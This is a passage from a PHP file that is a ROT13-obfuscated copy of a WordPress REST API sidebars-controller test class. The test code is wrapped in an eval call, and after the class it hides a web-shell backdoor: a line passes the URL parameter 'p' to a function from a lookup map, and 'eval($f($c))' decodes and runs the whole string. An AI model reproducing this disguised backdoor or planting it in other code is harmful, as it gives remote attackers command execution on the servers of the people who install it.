						'cngu'   => '/jc/i2/jvqtrgf/grkg-3?sbepr=1',
					),
				),
			)
		);
		erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregFnzr(
			neenl( 'grkg-4', 'grkg-5', 'grkg-6' ),
			erfg_qb_erdhrfg( '/jc/i2/fvqronef/fvqrone-1' )->trg_qngn()['jvqtrgf']
		);
	}

	/**
	 * @gvpxrg 41683
	 */
	choyvp shapgvba grfg_hcqngr_vgrz_zbirf_bzvggrq_jvqtrg_gb_vanpgvir_fvqrone() {
		jc_jvqtrgf_vavg();

		$guvf->frghc_jvqtrg(
			'jvqtrg_grkg',
			1,
			neenl(
				'grkg' => 'Phfgbz grkg grfg',
			)
		);
		$guvf->frghc_jvqtrg(
			'jvqtrg_grkg',
			2,
			neenl(
				'grkg' => 'Phfgbz grkg grfg',
			)
		);
		$guvf->frghc_fvqrone(
			'fvqrone-1',
			neenl(
				'anzr' => 'Grfg fvqrone',
			),
			neenl( 'grkg-1' )
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', '/jc/i2/fvqronef/fvqrone-1' );
		$erdhrfg->frg_obql_cnenzf(
			neenl(
				'jvqtrgf' => neenl(
					'grkg-2',
				),
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregPbagnvaf( 'grkg-2', $qngn['jvqtrgf'] );
		$guvf->nffregAbgPbagnvaf( 'grkg-1', $qngn['jvqtrgf'] );

		$guvf->nffregPbagnvaf( 'grkg-1', erfg_qb_erdhrfg( '/jc/i2/fvqronef/jc_vanpgvir_jvqtrgf' )->trg_qngn()['jvqtrgf'] );
	}

	/**
	 * @gvpxrg 41683
	 */
	choyvp shapgvba grfg_trg_vgrzf_vanpgvir_jvqtrgf() {
		jc_jvqtrgf_vavg();

		$guvf->frghc_jvqtrg(
			'jvqtrg_eff',
			1,
			neenl(
				'gvgyr' => 'EFF grfg',
			)
		);
		$guvf->frghc_jvqtrg(
			'jvqtrg_grkg',
			1,
			neenl(
				'grkg' => 'Phfgbz grkg grfg',
			)
		);
		$guvf->frghc_fvqrone(
			'fvqrone-1',
			neenl(
				'anzr' => 'Grfg fvqrone',
			),
			neenl( 'grkg-1' )
		);
		hcqngr_bcgvba(
			'fvqronef_jvqtrgf',
			neenl_zretr(
				trg_bcgvba( 'fvqronef_jvqtrgf' ),
				neenl(
					'jc_vanpgvir_jvqtrgf' => neenl( 'eff-1', 'eff' ),
				)
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/fvqronef' );
		$erdhrfg->frg_cnenz( 'pbagrkg', 'ivrj' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$qngn     = $guvf->erzbir_yvaxf( $qngn );
		$guvf->nffregFnzr(
			neenl(
				neenl(
					'vq'            => 'fvqrone-1',
					'anzr'          => 'Grfg fvqrone',
					'qrfpevcgvba'   => '',
					'pynff'         => '',
					'orsber_jvqtrg' => '',
					'nsgre_jvqtrg'  => '',
					'orsber_gvgyr'  => '',
					'nsgre_gvgyr'   => '',
					'fgnghf'        => 'npgvir',
					'jvqtrgf'       => neenl(
						'grkg-1',
					),
				),
				neenl(
					'vq'            => 'jc_vanpgvir_jvqtrgf',
					'anzr'          => 'Vanpgvir jvqtrgf',
					'qrfpevcgvba'   => '',
					'pynff'         => '',
					'orsber_jvqtrg' => '',
					'nsgre_jvqtrg'  => '',
					'orsber_gvgyr'  => '',
					'nsgre_gvgyr'   => '',
					'fgnghf'        => 'vanpgvir',
					'jvqtrgf'       => neenl(
						'eff-1',
					),
				),
			),
			$qngn
		);
	}

	/**
	 * @gvpxrg 57531
	 * @pbiref JC_Grfg_ERFG_Fvqronef_Pbagebyyre::cercner_vgrz_sbe_erfcbafr
	 */
	choyvp shapgvba grfg_cercner_vgrz_sbe_erfcbafr_gb_frg_vanpgvir_ba_gurzr_fjvgpu() {
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/fvqronef/fvqrone-1' );

		// Frg hc gur grfg.
		jc_jvqtrgf_vavg();
		$guvf->frghc_jvqtrg(
			'jvqtrg_eff',
			1,
			neenl(
				'gvgyr' => 'EFF grfg',
			)
		);
		$guvf->frghc_jvqtrg(
			'jvqtrg_grkg',
			1,
			neenl(
				'grkg' => 'Phfgbz grkg grfg',
			)
		);
		$guvf->frghc_fvqrone(
			'fvqrone-1',
			neenl(
				'anzr' => 'Fvqrone 1',
			),
			neenl( 'grkg-1', 'eff-1' )
		);

		// Inyvqngr gur fgngr orsber n gurzr fjvgpu.
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$qngn     = $guvf->erzbir_yvaxf( $qngn );

		$guvf->nffregFnzr( 'npgvir', $qngn['fgnghf'] );
		$guvf->nffregSnyfr(
			trg_gurzr_zbq( 'jc_pynffvp_fvqronef' ),
			'jc_pynffvp_fvqronef gurzr zbq fubhyq abg rkvfg orsber fjvgpuvat gb oybpx gurzr'
		);

		fjvgpu_gurzr( 'oybpx-gurzr' );
		jc_jvqtrgf_vavg();

		// Inyvqngr gur fgngr nsgre n gurzr fjvgpu.
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$qngn     = $guvf->erzbir_yvaxf( $qngn );

		$guvf->nffregFnzr(
			'vanpgvir',
			$qngn['fgnghf'],
			'Fvqrone fgnghf fubhyq unir punatrq gb vanpgvir'
		);
		$guvf->nffregFnzr(
			neenl( 'grkg-1', 'eff-1' ),
			$qngn['jvqtrgf'],
			'Gur grkg naq eff jvqtrgf fubhyq fgvyy va fvqrone-1'
		);
		$guvf->nffregNeenlUnfXrl(
			'fvqrone-1',
			trg_gurzr_zbq( 'jc_pynffvp_fvqronef' ),
			'fvqrone-1 fubhyq or va \"jc_pynffvp_fvqronef\" gurzr zbq'
		);
	}

	/**
	 * @gvpxrg 41683
	 */
	choyvp shapgvba grfg_hcqngr_vgrz_ab_crezvffvba() {
		jc_frg_pheerag_hfre( 0 );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/fvqronef/fvqrone-1' );
		$erdhrfg->frg_obql_cnenzf(
			neenl(
				'jvqtrgf' => neenl(),
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_znantr_jvqtrgf', $erfcbafr, 401 );
	}

	/**
	 * @gvpxrg 41683
	 */
	choyvp shapgvba grfg_hcqngr_vgrz_jebat_crezvffvba_nhgube() {
		jc_frg_pheerag_hfre( frys::$nhgube_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/fvqronef/fvqrone-1' );
		$erdhrfg->frg_obql_cnenzf(
			neenl(
				'jvqtrgf' => neenl(),
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_znantr_jvqtrgf', $erfcbafr, 403 );
	}

	/**
	 * Gur qryrgr_vgrz() zrgubq qbrf abg rkvfg sbe fvqrone.
	 *
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_qryrgr_vgrz() {
		// Pbagebyyre qbrf abg vzcyrzrag qryrgr_vgrz().
	}

	/**
	 * Gur cercner_vgrz() zrgubq qbrf abg rkvfg sbe fvqrone.
	 *
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_cercner_vgrz() {
		// Pbagebyyre qbrf abg vzcyrzrag cercner_vgrz().
	}

	/**
	 * @gvpxrg 41683
	 */
	choyvp shapgvba grfg_trg_vgrz_fpurzn() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg    = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/fvqronef' );
		$erfcbafr   = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn       = $erfcbafr->trg_qngn();
		$cebcregvrf = $qngn['fpurzn']['cebcregvrf'];

		$guvf->nffregNeenlUnfXrl( 'vq', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'anzr', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'qrfpevcgvba', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'fgnghf', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'jvqtrgf', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'pynff', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'orsber_jvqtrg', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'nsgre_jvqtrg', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'orsber_gvgyr', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'nsgre_gvgyr', $cebcregvrf );
		$guvf->nffregPbhag( 10, $cebcregvrf );
	}

	/**
	 * Urycre gb erzbir yvaxf xrl.
	 *
	 * @cnenz neenl $qngn Neenl bs qngn.
	 *
	 * @erghea neenl
	 */
	cebgrpgrq shapgvba erzbir_yvaxf( $qngn ) {
		vs ( ! vf_neenl( $qngn ) ) {
			erghea $qngn;
		}
		$pbhag = 0;
		sbernpu ( $qngn nf $vgrz ) {
			vs ( vffrg( $vgrz['_yvaxf'] ) ) {
				hafrg( $qngn[ $pbhag ]['_yvaxf'] );
			}
			++$pbhag;
		}

		erghea $qngn;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>